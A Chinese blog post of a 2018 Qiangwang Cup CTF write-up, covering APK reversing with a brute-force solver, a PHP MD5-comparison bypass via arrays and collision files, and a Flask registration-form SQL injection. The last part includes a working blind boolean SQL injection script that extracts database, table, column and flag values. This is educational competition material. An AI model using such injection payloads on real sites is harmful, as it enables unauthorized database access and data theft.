<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="T3stzer0">


    <meta name="subtitle" content="思考">




<title>第二届强网杯-QWB-部分Writeup | T3stzer0&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Home</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>

<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>

        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
			expand_toc()
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">第二届强网杯-QWB-部分Writeup</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">三月 26, 2018&nbsp;&nbsp;21:49:00</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/category/CTF/">CTF</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/20171010114317454.jpg" alt=""></p>
<blockquote>
<p>一个关注度很高、奖励很丰富的比赛，大佬很多很多<br>将比赛自己写出的一些题总结一下</p>
</blockquote>
<a id="more"></a>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛参赛的人一万三，着实吓了一跳，还有很多很多的企业队伍<br>但是与我无关，我是来凑热闹2333<br>有些题目确实比较有质量，一些大佬队都没拿下一血。也出现了一些web+pwn的新题型(如wechat那个题，简直了)，还有一些无源码的pwn也着实长见识了(pwn方面我学的那点玩意完全用不上)</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="SimpleCheck"><a href="#SimpleCheck" class="headerlink" title="SimpleCheck"></a>SimpleCheck</h2><p>这题很眼熟，好像之前在某个比赛见过，一个很简单的逆向<br>用dex2jar这个工具将apk中的dex逆向出java代码如下</p>
<pre><code class="lang-java">public class MainActivity
  extends c
{
  protected void onCreate(final Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2130968603);
    paramBundle = (EditText)findViewById(2131427422);
    findViewById(2131427423).setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        if (a.a(paramBundle.getText().toString()))/*a.a()函数是关键*/
        {
          Toast.makeText(jdField_this, &quot;You get it~&quot;, 1).show();
          return;
        }
        Toast.makeText(jdField_this, &quot;Sorry its wrong&quot;, 1).show();
      }
    });
  }
}
</code></pre>
<p>很明显<code>a.a()</code>这个函数是关键点，代码如下</p>
<pre><code class="lang-java">public class a
{
  private static int[] a = { 0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312 };
  private static int[] b = { 13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108 };
  private static int[] c = { 38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666 };
  private static int[] d = { 0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562 };

  public static boolean a(String paramString)/*传进输入框的String*/
  {
    if (paramString.length() != b.length) {/*长度与b数组等长*/
      return false;
    }
    int[] arrayOfInt = new int[a.length];
    arrayOfInt[0] = 0;
    paramString = paramString.getBytes();
    int k = paramString.length;
    int i = 0;
    int j = 1;
    while (i &lt; k)/*arrayOfInt[0]=0然后后面的数值为传入字符串的拷贝*/
    {
      arrayOfInt[j] = paramString[i];
      j += 1;
      i += 1;
    }
    i = 0;
    for (;;)
    {
      if (i &gt;= c.length) {
        break label166;
      }/*检验函数*/
      if ((a[i] != b[i] * arrayOfInt[i] * arrayOfInt[i] + c[i] * arrayOfInt[i] + d[i]) || (a[(i + 1)] != b[i] * arrayOfInt[(i + 1)] * arrayOfInt[(i + 1)] + c[i] * arrayOfInt[(i + 1)] + d[i])) {
        break;
      }
      i += 1;
    }
    label166:
    return true;
  }
}
</code></pre>
<p>很明显检验函数检查了<code>arrayOfInt[i]</code>与<code>arrayOfInt[i+1]</code>对<code>a、b、c、d</code>数组的关系，其实就是  <code>a=b*x1^2+c*x1+d &amp;&amp; a=b*x2^2+c*x2+d</code><br>我们至于要这四个数组拿出来然后将输入的数值逐个爆破就成了</p>
<pre><code class="lang-python">a = [0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818,
     559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524,
     417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557,
     440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312]
b = [13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932,
     37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968,
     45654, 51972, 64956, 45293, 64752, 37108]
c = [38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762,
     59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879,
     14436, 60468, 19926, 47198, 8406, 64666]
d = [0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406,
     540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124,
     -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507,
     258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562]

flag = []
i = 0
while i &lt; len(b):
    for front in range(33, 128):
        for back in range(33, 128):
            if (a[i] == b[i] * front * front + c[i] * front + d[i]) and (
                    a[i + 1] == b[i] * back * back + c[i] * back + d[i]):
                print front, back
                flag.append(chr(front))
    i += 1

print &quot;&quot;.join(flag) + &quot;}&quot;
</code></pre>
<p><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/22-20-11.jpg" alt=""></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><p>源码找到提示<br>第一关<br><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/22-22-20.jpg" alt=""><br>老套路了，用数组就可以绕过，因为<code>md5()</code>函数遇到数组会返回<code>NULL</code>，然后就绕过了<br>Payload ：<code>param1[]=1&amp;param2[]=2</code><br>第二关<br><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/22-22-27.jpg" alt="">同理，上次的Payload也能绕过<br>第三关<br><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/22-25-25.jpg" alt=""></p>
<p>多了个(string)强制类型转换，再也不能用数组绕过了，因为(string)强制类型转换之后数组会变成Array,而这玩意即使你数字里面的值是不一样的也会判断为相等。<br>这里我们可用MD5相同的碰撞文件进行绕过<br>利用到一个相同MD5文件生成的程序fastcoll.exe，作用是生成两个不同内容但是MD5的值却是一样的文件(猜测应该是基于我国信安领域的风云人物——王小云教授的快速MD5碰撞算法)<br>用工具生成两个文件之后用python对文件进行url编码再上传就可以了</p>
<pre><code class="lang-python">import urllib
f1 = open(&quot;./msg1.bin&quot;,&quot;rb&quot;)
f2 = open(&quot;./msg2.bin&quot;,&quot;rb&quot;)
m1 = f1.read()
m2 = f2.read()
print urllib.quote(m1)
print urllib.quote(m2)
</code></pre>
<p><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/23-55-55.jpg" alt=""></p>
<h2 id="Python-is-the-best-language1"><a href="#Python-is-the-best-language1" class="headerlink" title="Python_is_the_best_language1"></a>Python_is_the_best_language1</h2><p>拿到源码发现是flask的web站，简单浏览了一下，由于之前就耳闻flask不用担心sql注入之类的言论，我就没太注意注入这方面反而去寻找有没有提示以及模板注入之类的<br>最后发现类似于</p>
<pre><code class="lang-python">user = query_db(&#39;select * from users where username = %s&#39; % &quot;请求的参数&quot;）
</code></pre>
<p>这种用格式化字符串构造sql语句的是仍然会产生sql注入的，而</p>
<pre><code class="lang-python">user = query_db(&#39;select * from users where username = ?&#39;, [the_username], one=True)
</code></pre>
<p>这种的危险字符将会被转义而不用担心sql注入问题<br>在源码的<code>form.py</code>中的<code>RegistrationForm</code>类发现<code>email</code>并没有过滤，而是直接调用了自己写的<code>mysql.One()</code>函数<br><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/00-03-07.jpg" alt=""><br>看起来注入点很可能是在这里<br>来到<code>others.py</code>中定义的<code>mysql.One()</code>：<br><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/00-04-05.jpg" alt=""></p>
<p>继续跟踪函数<code>mysql.Sel()</code>：<br><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/00-04-37.jpg" alt=""></p>
<p>很明显看到构造的语句并没有使用flask带的转义功能而是直接凭借Sql语句然后返回的<br>于是我们可以利用注册界面构造<code>email</code>参数为注入语句</p>
<pre><code class="lang-sql"> email = &#39; or ord(substr((查询语句) {字符串偏移} , 1 ))&amp;{按位与}
</code></pre>
<p>由上可知邮箱找到及sql语句为真时会<code>raise</code>一个<code>Please use a diffrent email address.</code>错误，我们可以用来当盲注的依据。唯一要注意的是我们需要将注册页面的<code>token</code>爬下来顺便带上，提交后下次的<code>token</code>也要带上</p>
<pre><code class="lang-python">import requests, re
url = &quot;http://117.50.16.51:20000/register&quot;
r = requests.get(url)
token = re.findall(&#39;&lt;input id=&quot;csrf_token&quot;.*?value=&quot;(.*?)&quot;&gt;&#39;, r.text)[0]
str = &#39;&#39;
payload_db = &quot;(database())&quot;
# flask
payload_tables = &quot;(select\x20group_concat(table_name)\x20from\x20information_schema.tables\x20where\x20table_schema=database())&quot;
# flaaaaag,followers,post,user
payload_columns = &quot;(select\x20group_concat(column_name)\x20from\x20information_schema.columns\x20where\x20table_name=&#39;flaaaaag&#39;)&quot;
# flllllag
payload_flag = &quot;(select\x20flllllag\x20from\x20flaaaaag)&quot;
#QWB{us1ng_val1dator_caut1ous}
l = [1, 2, 4, 8, 16, 32, 64]
for i in range(1, 50):
    n = 0
    for j in l:
        payload = &quot;&#39;or\x20ord(substr(&quot; + payload_flag + &quot;,{},1))&amp;{}#@gmail.com&quot;.format(i, j)
        post_data = {
            &#39;csrf_token&#39;: token,
            &#39;username&#39;: &#39;testzero&#39;,
            &#39;email&#39;: payload,
            &#39;password&#39;: &#39;sa&#39;,
            &#39;password2&#39;: &#39;sa&#39;,
            &#39;submit&#39;: &#39;Register&#39;
        }
        r = requests.post(url, data=post_data)
        token = re.findall(&#39;&lt;input id=&quot;csrf_token&quot;.*?value=&quot;(.*?)&quot;&gt;&#39;, r.text)[0]
        if &quot;different email address&quot; in r.text:
            n += j
    str += chr(n)
    print str
</code></pre>
<p><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/00-12-41.jpg" alt=""></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>很简单的位移然后加入其他干扰的像素点，丢进Stegsolve偏移100就能看到flag了<br><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/22-05-12.jpg" alt=""><br>最后混得了个206名，也不知道有没有个安慰奖</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>PWN题太嫩了，学了几个月门也没算进</li>
<li>Web的漏洞积累薄弱，一些新漏洞、新奇的漏洞都未涉及，导致思维面过窄</li>
<li>此次比赛见识到自己的很多如积累过少、认识过浅等致命缺点，任何领域的熟悉、精通都绝非易事</li>
</ul>
<p>期间经历了很多事<br>人生不就是<del>起起</del>落落落落落落落落落落落落落落落落落落落落落落落落么</p>
<p><img src="/2018/03/26/第二届强网杯-QWB-部分Writeup/]GSXMJ5UWA@JXUOGWYFN3]I.jpg" alt=""></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>T3stzer0</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://www.testzero-wz.com/2018/03/26/第二届强网杯-QWB-部分Writeup/">https://www.testzero-wz.com/2018/03/26/第二届强网杯-QWB-部分Writeup/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tag/CTF/"># CTF</a>
                    
                        <a href="/tag/WriteUp/"># WriteUp</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2018/03/27/RPO攻击解析/">RPO攻击解析</a>
            
            
            <a class="next" rel="next" href="/2018/03/18/基于Tk的多线程选课程序/">基于Tk的多线程选课程序</a>
            
        </section>


    </article>
</div>

        </div>
        <!-- 
<footer id="footer" class="footer">
    <div class="copyright">
        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

-->
<script src="/js/highlight.min.js"></script>
<script>hljs.highlightAll();</script>

    </div>
</body>
</html>
